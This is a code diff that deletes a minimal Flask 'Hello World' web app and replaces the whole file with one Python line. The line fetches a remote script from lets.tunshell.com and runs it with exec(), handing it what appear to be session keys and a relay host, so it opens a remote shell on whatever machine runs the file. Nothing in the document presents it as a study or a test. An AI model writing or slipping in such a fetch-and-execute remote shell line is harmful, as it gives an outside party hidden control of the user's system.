@@ -1,14 +1,1 @@
-from flask import Flask
-import os
-
-app = Flask(__name__)
-
-@app.route('/')
-def hello():
-    return "Hello World!"
-
-if __name__ == '__main__':
-    port = os.environ.get('FLASK_PORT') or 8080
-    port = int(port)
-
-    app.run(port=port,host='0.0.0.0')
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","zuLBeATGGfS6gexHfu0U6I","1Kr28upp0ZM3Pfvyj9evdS","au.relay.tunshell.com"]})
